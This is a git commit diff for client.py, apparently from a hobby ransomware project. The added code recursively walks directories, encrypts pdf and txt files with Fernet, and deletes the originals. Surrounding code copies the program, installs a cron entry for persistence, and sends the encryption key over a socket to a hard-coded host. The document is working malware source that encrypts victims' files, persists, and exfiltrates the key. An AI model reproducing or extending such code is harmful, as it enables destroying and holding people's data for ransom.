39b0f0bac506b81431e72c88715f55eabea8a257
shad0wcrawl3r <ashwinbelbase@gmail.com>
2021-05-05 13:48:02 +0545

    Turned everything into a singel module

--- client.py
+++ client.py
@@ -1,16 +1,19 @@
+from cryptography.fernet import Fernet
 from socket import socket, gethostname
 from os import makedirs,listdir,getcwd,remove
 from os.path import dirname, exists
+from os.path import isdir,isfile,splitext
 from pathlib import Path
 from time import sleep
 from subprocess import Popen,call
 
 
-import sweeper
-import encrypt
+# import sweeper
+# import encrypt
 
 port=11111
 host='192.168.1.127'
+encr=['pdf','txt']
 
 
 sock=socket()
@@ -24,6 +27,56 @@ def copy_self():
         except PermissionError:
             pass
     checkCron()
+
+def genKey():
+    symkey = Fernet.generate_key()
+
+    with open('symkey','wb') as kf:
+        kf.write(symkey)
+
+
+def encryptor(file):
+    if not exists ('symkey'):
+        genKey()
+
+    with open('symkey','rb') as kf:
+        symkey=kf.read()
+        f=Fernet(symkey)
+
+
+    with open(file,'rb') as tf:
+        crypto=f.encrypt(tf.read())
+    remove(file)
+    
+
+    with open(file+".enc",'wb') as tf,open('list_of_encrypted.plain','w') as encf:
+        tf.write(crypto)
+        encf.write(str(file)+"\n")
+
+def movein(dirpath='/home/ashwin/Documents/projects/Ransomware'):
+    for each in listdir(dirpath):
+        if each[0]=='.':
+            continue
+        fpath=dirpath+'/'+each
+        # print(fpath)
+        if isdir(fpath):
+            # print('isDir')
+            try:
+                movein(fpath)
+            except OSError:
+                continue
+        elif isfile(fpath):
+            # print('isFile')
+            extension=splitext(fpath)[1][1:]
+            print(extension)
+            # print(extension)
+            if extension in encr:
+                # print(fpath)
+                encryptor(fpath)
+                print('encrypted %s'%each)
+        else:
+            print('Cant tell type')
+
 
 def checkCron():
     cmd='crontab -l > cronreader'
@@ -52,12 +105,12 @@ def connector():
         
 def sender():
     connector()
-    sweeper.movein()
+    movein()
     while True:
         sock.send(b"Hello. File starts now\n")
         sock.send(b"--------------------------------------------------------------\n")
         if not exists('symkey'):
-            encrypt.genKey()    
+            genKey()    
         with open('symkey','rb') as f:
             data=f.read()
 
